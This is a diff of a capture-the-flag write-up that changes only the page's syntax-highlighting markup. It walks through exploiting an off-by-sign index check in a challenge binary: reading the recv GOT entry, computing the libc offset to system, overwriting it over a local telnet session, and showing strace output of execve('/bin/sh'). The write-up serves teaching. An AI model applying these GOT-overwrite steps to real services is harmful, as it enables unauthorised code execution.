@@ -228,13 +228,13 @@ Connection closed by foreign host.</code></pre>
 <p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
 <p><img style="float:center" src="./images/ida-atoi-write.png" alt="Write - atoi" /></p>
 <p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
-<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
+<div class="sourceCode"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
 i = atoi(str);
-<span class="kw">if</span> (i &gt; <span class="dv">9</span>) {
+<span class="cf">if</span> (i &gt; <span class="dv">9</span>) {
 	error();
 	exit();
 }
-do_stuff;</code></pre>
+do_stuff;</code></pre></div>
 <p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
 <p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
 </section>
@@ -352,48 +352,48 @@ $ </code></pre>
 <ul>
 <li>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</li>
 </ul>
-<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="kw">grep</span> -A2 recv@plt
-<span class="kw">08048980</span> <span class="kw">&lt;</span>recv@plt<span class="kw">&gt;</span>:
- <span class="kw">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="fu">grep</span> -A2 recv@plt
+<span class="ex">08048980</span> <span class="op">&lt;</span>recv@plt<span class="op">&gt;</span>:
+ <span class="ex">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></div>
 <p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
 <ul>
 <li>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</li>
 </ul>
-<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="kw">grep</span> <span class="st">' recv@'</span>
-  <span class="kw">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
-$ <span class="kw">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="kw">grep</span> <span class="st">' system@'</span>
-  <span class="kw">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-$ <span class="kw">echo</span> <span class="ot">$((</span>0x00039100-0x000cebf0<span class="ot">))</span>
-<span class="kw">-613104</span></code></pre>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' recv@'</span>
+  <span class="ex">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
+$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' system@'</span>
+  <span class="ex">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+$ <span class="bu">echo</span> <span class="va">$((</span>0x00039100-0x000cebf0<span class="va">))</span>
+<span class="ex">-613104</span></code></pre></div>
 <p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
-<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">telnet</span> localhost 31337
-<span class="kw">read</span>
-<span class="kw">Input</span> position to read from:
-<span class="kw">-32</span>
-<span class="kw">Value</span> at position -32: -1217696784
-<span class="kw">write</span>
-<span class="kw">Input</span> position to write to:
-<span class="kw">-2147483634</span>
-<span class="kw">Input</span> numeric value to write:
-<span class="kw">-1218309888</span>
-<span class="kw">Value</span> at position -2147483634: -1218309888
-<span class="kw">math</span>
-<span class="kw">Result</span> of math: -1</code></pre>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">telnet</span> localhost 31337
+<span class="bu">read</span>
+<span class="ex">Input</span> position to read from:
+<span class="ex">-32</span>
+<span class="ex">Value</span> at position -32: -1217696784
+<span class="fu">write</span>
+<span class="ex">Input</span> position to write to:
+<span class="ex">-2147483634</span>
+<span class="ex">Input</span> numeric value to write:
+<span class="ex">-1218309888</span>
+<span class="ex">Value</span> at position -2147483634: -1218309888
+<span class="ex">math</span>
+<span class="ex">Result</span> of math: -1</code></pre></div>
 <p>Reading from <code>-32</code> it’s equivalent of reading <code>-32*4</code> bytes before our buffer. <code>0x804c040-32*4</code> is <code>0x804bfc0</code>, this is the <code>recv</code> GOT entry. <code>-1218309888</code> is <code>-1217696784-613104</code>.</p>
 <p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
-<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[<span class="kw">...</span>]
-[<span class="kw">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="kw">43</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="kw">1</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="kw">1</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="kw">1</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="kw">1</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="kw">1</span>
-[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="kw">1</span>
-[<span class="kw">...</span>]
-[<span class="kw">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="kw">0</span>
-[<span class="kw">pid</span>  4902] brk(0)                      = <span class="kw">0x9a04000</span>
-[<span class="kw">...</span>]</code></pre>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+[<span class="ex">...</span>]
+[<span class="ex">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="ex">43</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="ex">1</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="ex">1</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="ex">1</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="ex">1</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="ex">1</span>
+[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="ex">1</span>
+[<span class="ex">...</span>]
+[<span class="ex">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="ex">0</span>
+[<span class="ex">pid</span>  4902] brk(0)                      = <span class="ex">0x9a04000</span>
+[<span class="ex">...</span>]</code></pre></div>
 <p>We successfully <strong>called <code>execve</code></strong>!</p>
 </section>
 <section id="parameters-to-execve" class="level2">
